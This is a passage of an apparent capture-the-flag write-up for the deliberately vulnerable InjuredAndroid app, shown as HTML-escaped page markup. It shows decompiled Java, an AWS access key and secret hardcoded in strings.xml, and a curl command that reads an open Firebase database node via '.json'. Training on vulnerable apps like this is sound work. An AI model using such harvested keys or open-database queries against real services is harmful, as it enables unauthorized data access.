            X&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;Y&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            FlagEightLoginActivity flagEightLoginActivity &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; FlagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            flagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;flagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;FlagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Snackbar X2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;X&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;AWS profiles and credentials.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;Y&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            FlagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;from the hint above on to use AWS CLI. Now let look for AWS profiles and credentials in the application.&lt;/p&gt;
&lt;p&gt;Most of the strings in an android application are located at the strings.xml file in the res directory.
in the strings.xml file we have two intresting strings as shown in the code snippet.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;AWS_ID&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;AKIAZ36DGKTUIOLDOBN6&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;AWS_SECRET&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;show how to use AWS cli to get the flag.&lt;/p&gt;
&lt;h3 id=&#34;flag9--firebase&#34;&gt;Flag9- FireBase&lt;/h3&gt;
&lt;p&gt;This challenge is about understanding firebase realtime database rules.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;goToFlagNineFirebaseActivity&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        startActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; FlagNineFirebaseActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We start  our analysis in the main activity, for the level nine is defined in FlagNineFirebaseActivity. Let analyze the level nine security.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;FlagNineFirebaseActivity&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; decode &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Base64&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ZmxhZ3Mv&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;     &lt;span style=&#34;color:#6272a4&#34;&gt;//  flags/ 
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; decode&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;decode&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;decodedDirectory&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    Charset charset &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;charset&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;decode&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; charset&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    f b2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    d d2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    d h &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;database.child(refDirectory)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;y&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;we can decode the base64 encoded strings in the above code to understand what is happening as shown in the code above.&lt;/p&gt;
&lt;p&gt;clicking on the hint button, we get an hint on what to do as shown in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        String str&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;FlagNineFirebaseActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                str &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Use the .json trick with database url&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#ff79c6&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;FlagNineFirebaseActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                str &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Filenames.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#ff79c6&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;let now look for the database url in the strings.xml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;firebase_database_url&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;https://injuredandroid.firebaseio.com&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the firebase node we are interested is the flags node. to check if the endpoint or the node is vulnerable is to add a .json as shown in the image below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;vx@archie:injured$ curl https://injuredandroid.firebaseio.com/flags/.json
